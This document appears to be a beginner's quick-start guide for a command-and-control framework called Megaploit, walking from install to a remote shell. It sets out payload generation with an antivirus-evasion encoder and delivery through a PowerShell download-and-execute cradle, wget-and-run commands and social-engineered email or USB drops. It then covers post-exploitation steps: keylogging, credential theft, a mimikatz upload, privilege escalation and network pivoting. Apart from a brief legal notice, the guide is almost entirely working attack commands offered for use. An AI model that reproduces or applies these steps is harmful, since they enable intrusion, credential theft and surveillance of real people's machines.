# Megaploit Quick-Start Guide

> **Goal:** Get from a fresh install to an active shell on a target machine in under 10 minutes.  
> **Audience:** Complete beginners — no prior C2 experience required.

---

## Table of Contents

1. [What is Megaploit?](#1-what-is-megaploit)
2. [Prerequisites](#2-prerequisites)
3. [Install Megaploit](#3-install-megaploit)
4. [Start the Server](#4-start-the-server)
5. [Build Your First Payload](#5-build-your-first-payload)
6. [Deliver the Payload](#6-deliver-the-payload)
7. [Catch a Shell](#7-catch-a-shell)
8. [Your First Commands](#8-your-first-commands)
9. [Save Your Work](#9-save-your-work)
10. [What's Next?](#10-whats-next)

---

## 1. What is Megaploit?

Megaploit is a **Command & Control (C2) framework** — a tool that lets you run commands on a remote computer after it has executed a payload you deliver.

Think of it like this:

```
You (attacker machine)          Target machine
┌──────────────────┐            ┌──────────────────┐
│  Megaploit       │◄──shell────│  Payload running │
│  Server          │            │  on target       │
└──────────────────┘            └──────────────────┘
```

1. You start the Megaploit **server** and tell it to listen for connections.
2. You create a **payload** — a small program that the target will run.
3. When the target runs the payload it "calls home" and gives you a shell.
4. You type commands in Megaploit; they run on the target.

> ⚠️ **Legal notice:** Only use Megaploit on systems you own or have written permission to test. Unauthorised access is illegal.

---

## 2. Prerequisites

### Minimum requirements

| Item | Requirement |
|------|-------------|
| OS   | Kali Linux, Ubuntu 20+, Parrot OS, or Windows 10+ |
| Python | 3.8 or newer |
| pip  | Latest (`pip install --upgrade pip`) |
| Network | Attacker and target must be able to reach each other (same LAN, VPN, or public IP with port forwarding) |

### Check your Python version

```bash
python3 --version
# Python 3.10.12  ← good, any 3.8+ is fine
```

### Check you have pip

```bash
pip3 --version
# pip 23.0 ...  ← good
```

---

## 3. Install Megaploit

### Option A — Clone from GitHub (recommended)

```bash
# 1. Clone the repository
git clone https://github.com/Josefifir/Megaploit.git
cd Megaploit

# 2. (Optional but recommended) create a virtual environment
python3 -m venv venv
source venv/bin/activate        # Linux / macOS
# venv\Scripts\activate         # Windows PowerShell

# 3. Install Python dependencies
pip install -r requirements.txt
```

### Option B — Install directly

```bash
pip install megaploit
```

### Verify the install

```bash
python3 -m megaploit --version
# Megaploit v4.1.0
```

If you see `ModuleNotFoundError`, make sure your virtual environment is active:

```bash
source venv/bin/activate
pip install -r requirements.txt
```

---

## 4. Start the Server

### Basic start

```bash
python server.py -lh <your-ip> -p 4444
```

Replace `<your-ip>` with the IP address the agent will call back to (your machine's IP
visible to the target — not `0.0.0.0`).

You should see:

```
[+] TLS auto-cert (required for C agent)  →  loot/tls/megaploit.crt
[+] Listener ready on 0.0.0.0:4444
[*] Agents should call back to  192.168.1.10:4444
megaploit >
```

**TLS is always on.** The server auto-generates a self-signed certificate in
`loot/tls/` on first run and reuses it on every subsequent start. You do not
need a `--tls` flag or a pre-existing certificate.

### Custom port

```bash
python server.py -lh 192.168.1.10 -p 8443
```

### Bring your own certificate (optional)

If you have a real certificate (e.g. from Let's Encrypt or a CA):

```bash
python server.py -lh 192.168.1.10 -p 4444 --cert server.crt --key server.key
```

### Restrict which IPs may connect (optional)

```bash
python server.py -lh 192.168.1.10 -p 4444 --allow-ip 10.0.0.5 --allow-ip 10.0.0.6
```

Any connection from an IP not on the list is dropped before any data is read.

### Tip — run on a VPS or cloud server

If your target is on the internet, start Megaploit on a **VPS with a public IP**:

```bash
# On your VPS (e.g., 203.0.113.10)
python server.py -lh 203.0.113.10 -p 443
```

Make sure the chosen port is open in your firewall / security group.

---

## 5. Build Your First Payload

The `generate` command builds a payload. Here is the most common usage:

```
megaploit > generate
```

You will be prompted for:

| Prompt | What to enter | Example |
|--------|---------------|---------|
| `Payload format` | The file type for the target OS | `exe` for Windows, `elf` for Linux |
| `LHOST` | **Your** IP address the target will connect back to | `192.168.1.50` |
| `LPORT` | The port Megaploit is listening on | `4444` |
| `Output file` | Where to save the payload | `payload.exe` |

### Example — Windows EXE payload (most common)

```
megaploit > generate
[?] Payload format: exe
[?] LHOST: 192.168.1.50
[?] LPORT: 4444
[?] Output file: payload.exe
[*] Generating payload...
[+] Saved: payload.exe (72 KB)
```

### Example — Linux ELF binary

```
megaploit > generate
[?] Payload format: elf
[?] LHOST: 192.168.1.50
[?] LPORT: 4444
[?] Output file: agent
[*] Generating payload...
[+] Saved: agent (48 KB)
```

### Example — Python script (works anywhere Python is installed)

```
megaploit > generate
[?] Payload format: py
[?] LHOST: 192.168.1.50
[?] LPORT: 4444
[?] Output file: updater.py
[+] Saved: updater.py
```

### Example — PowerShell one-liner (great for quick tests)

```
megaploit > generate
[?] Payload format: ps1
[?] LHOST: 192.168.1.50
[?] LPORT: 4444
[?] Output file: run.ps1
[+] Saved: run.ps1
```

### Add an encoder to avoid antivirus detection

```
megaploit > generate
[?] Payload format: exe
[?] LHOST: 192.168.1.50
[?] LPORT: 4444
[?] Encoder: xor_b64
[?] Output file: payload_encoded.exe
[+] Saved: payload_encoded.exe
```

> See [`docs/PAYLOAD_BUILDER.md`](PAYLOAD_BUILDER.md) for all 14 formats and 12 encoders.

---

## 6. Deliver the Payload

The payload file sits on **your** machine. You need to get it onto the target and run it.

### Method A — Python HTTP server (easiest for a lab)

```bash
# From the directory containing your payload, start a web server
python3 -m http.server 8000
# Serving HTTP on 0.0.0.0 port 8000 ...
```

On the **target machine**, open a browser and navigate to:

```
http://192.168.1.50:8000/payload.exe
```

Download and run the file.

### Method B — PowerShell download cradle (Windows target, no browser needed)

Run this on the **target** in PowerShell:

```powershell
# Download and execute in one line
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50:8000/run.ps1')
```

Or download to disk first:

```powershell
Invoke-WebRequest -Uri http://192.168.1.50:8000/payload.exe -OutFile C:\Temp\payload.exe
Start-Process C:\Temp\payload.exe
```

### Method C — Wget / curl (Linux target)

```bash
# On the Linux target
wget http://192.168.1.50:8000/agent -O /tmp/agent
chmod +x /tmp/agent
/tmp/agent &
```

### Method D — Email / USB (physical access)

Copy `payload.exe` to a USB drive or send it as an email attachment (use social engineering). When the target opens it, you get a shell.

> **Lab tip:** For testing in a VM lab, just copy the file to a shared folder or use a host-only network.

---

## 7. Catch a Shell

Back in Megaploit, as soon as the target runs the payload you'll see:

```
[+] New session opened: session-1
    Host: 192.168.1.100
    OS:   Windows 10 Pro (x64)
    User: DESKTOP-ABC\john
megaploit >
```

### List all open sessions

```
megaploit > sessions
ID          Host             OS            User
session-1   192.168.1.100    Windows 10    john
```

### Interact with (open) a session

```
megaploit > interact session-1
[*] Switching to session session-1
[session-1] >
```

You are now inside the remote shell. Everything you type runs on the target.

---

## 8. Your First Commands

Once inside a session (`[session-1] >`), here are the most useful commands to start with:

### Find out who and where you are

```bash
# Who am I on the target?
[session-1] > whoami
DESKTOP-ABC\john

# What directory am I in?
[session-1] > pwd
C:\Users\john

# What machine is this?
[session-1] > sysinfo
Hostname:  DESKTOP-ABC
OS:        Windows 10 Pro Build 19045
Arch:      x64
User:      john
Domain:    WORKGROUP
```

### Look around the filesystem

```bash
# List files in current directory
[session-1] > ls
 Directory: C:\Users\john

Mode    Name
----    ----
d       Desktop
d       Documents
d       Downloads
-       NTUSER.DAT

# Change directory
[session-1] > cd Desktop

# Print a file
[session-1] > cat secret.txt
Password: SuperSecret123
```

### Run a shell command

```bash
# Run any Windows command
[session-1] > shell ipconfig
Windows IP Configuration
Ethernet adapter Ethernet:
   IPv4 Address: 192.168.1.100
   Subnet Mask:  255.255.255.0

# Run a PowerShell command
[session-1] > powershell Get-Process | Select-Object -First 5
```

### Upload and download files

```bash
# Download a file FROM the target TO your machine
[session-1] > download C:\Users\john\passwords.txt
[+] Downloaded: passwords.txt (1.2 KB)

# Upload a file FROM your machine TO the target
[session-1] > upload /root/tools/mimikatz.exe C:\Temp\m.exe
[+] Uploaded: C:\Temp\m.exe
```

### Take a screenshot

```bash
[session-1] > screenshot
[+] Screenshot saved: screenshot_20240115_143022.png
```

### Start a keylogger

```bash
# Start recording keystrokes
[session-1] > keyscan_start
[*] Keylogger started

# ... wait a minute while the user types ...

# Dump what was captured
[session-1] > keyscan_dump
[FIREFOX] john@gmail.com  MyPassword456
[NOTEPAD] Meeting notes for ...

# Stop the keylogger
[session-1] > keyscan_stop
```

### Background the session and return to the main menu

```bash
# Background this session (it stays alive)
[session-1] > background
megaploit >

# Come back to it later
megaploit > interact session-1
[session-1] >
```

---

## 9. Save Your Work

### Save the session log to a file

```bash
[session-1] > log save /root/engagement/session1.log
[+] Log saved
```

### Export session info to the database

Megaploit automatically logs all commands and output to its built-in database. To query it:

```
megaploit > db_status
[*] Database: connected (megaploit.db)

megaploit > db_hosts
Host              OS           First seen
192.168.1.100     Windows 10   2024-01-15 14:25:00

megaploit > db_creds
User    Password         Source
john    SuperSecret123   filesystem
```

### Export to a file

```
megaploit > db_export /root/engagement/report.json
[+] Exported 3 hosts, 2 credentials to report.json
```

---

## 10. What's Next?

You have a working shell — here is where to go from here:

### Learn more commands

→ [`docs/CLI_REFERENCE.md`](CLI_REFERENCE.md) — every single command with examples

### Escalate privileges

```bash
# Check what privileges you have
[session-1] > getprivs

# Try automatic privilege escalation
[session-1] > getsystem

# Run local exploit suggester
megaploit > use post/suggest_exploit
megaploit > set SESSION session-1
megaploit > run
```

→ See [`docs/MODULE_SYSTEM.md`](MODULE_SYSTEM.md) for the full module list

### Pivot into the internal network

```bash
# Add a pivot route through this session
megaploit > route add 10.10.10.0/24 session-1

# Set up a SOCKS5 proxy
[session-1] > socks_start 1080
# Now proxychains routes through the target
```

→ See [`docs/NETWORKING.md`](NETWORKING.md) for the full pivoting guide

### Build a more evasive payload

→ See [`docs/PAYLOAD_BUILDER.md`](PAYLOAD_BUILDER.md) for encoder stacking and format comparison

### Professional engagements

→ See the **Professional Pentester Reference** section in [`README.md`](../README.md)

---

## Quick Reference Card

| Task | Command |
|------|---------|
| Start server | `python3 -m megaploit` |
| Build payload | `megaploit > generate` |
| List sessions | `megaploit > sessions` |
| Open session | `megaploit > interact <id>` |
| Who am I | `[session] > whoami` |
| System info | `[session] > sysinfo` |
| List files | `[session] > ls` |
| Read file | `[session] > cat <file>` |
| Download file | `[session] > download <remote-path>` |
| Upload file | `[session] > upload <local> <remote>` |
| Run command | `[session] > shell <cmd>` |
| Screenshot | `[session] > screenshot` |
| Background session | `[session] > background` |
| Kill session | `[session] > exit` |
| Help | `megaploit > help` or `[session] > help` |

---

*Next: [CLI Reference →](CLI_REFERENCE.md)*
